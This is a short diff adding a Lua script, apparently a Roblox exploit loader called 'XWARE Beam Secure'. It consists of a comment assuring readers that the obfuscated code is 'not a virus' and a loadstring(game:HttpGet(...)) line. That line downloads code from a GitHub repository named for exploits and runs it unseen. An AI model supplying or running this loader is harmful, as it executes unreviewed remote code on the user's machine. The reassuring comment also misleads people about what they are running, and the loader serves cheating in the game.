@@ -1,0 +1,4 @@
+-- its not a virus, its just obfuscated not to get hacked. Please Dont Worry About It Being Obfuscated.
+-- XWARE Beam Secure
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ArceusXEditsOfficial/XWARE-exploitx/main/Loader"))();
